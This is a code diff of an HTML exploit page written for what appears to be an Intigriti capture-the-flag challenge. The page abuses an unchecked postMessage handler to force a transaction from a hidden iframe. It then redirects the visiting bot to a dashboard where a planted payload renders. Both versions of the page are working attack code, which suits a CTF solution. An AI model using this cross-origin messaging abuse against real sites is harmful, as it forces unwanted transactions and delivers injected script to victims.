@@ -1,28 +1,25 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>Exploit Loading...</h1>
+    <iframe id="target" src="https://challenge-0126.intigriti.io/buy.html?currency=BTC&price=1" width="0" height="0"></iframe>
     <script>
-        // 1. Open the vulnerable 'buy' page
-        const botWin = window.open("https://challenge-0126.intigriti.io/buy.html?currency=BTC&price=1");
-
-        setTimeout(() => {
-            // 2. Use the postMessage bug to force a transaction
-            // This puts your "nickname" (the payload above) into the Market Watch list
-            botWin.postMessage({
+        const ifr = document.getElementById('target');
+        
+        function send() {
+            ifr.contentWindow.postMessage({
                 type: 'submitTransaction',
-                transaction: {
-                    toAddress: '0x1337',
-                    currency: 'BTC',
-                    amount: 0.000001
-                }
+                transaction: { toAddress: '0x1337', currency: 'BTC', amount: 0.000001 }
             }, '*');
+        }
 
-            // 3. Redirect the bot to the dashboard where the nickname is rendered
-            setTimeout(() => {
-                botWin.location.href = "https://challenge-0126.intigriti.io/dashboard.html";
-            }, 2000);
-        }, 4000);
+        // Send the message every second for 10 seconds
+        let interval = setInterval(send, 1000);
+
+        // After 10 seconds, move the WHOLE bot to the dashboard
+        setTimeout(() => {
+            clearInterval(interval);
+            window.location.href = "https://challenge-0126.intigriti.io/dashboard.html";
+        }, 10000);
     </script>
 </body>
 </html>
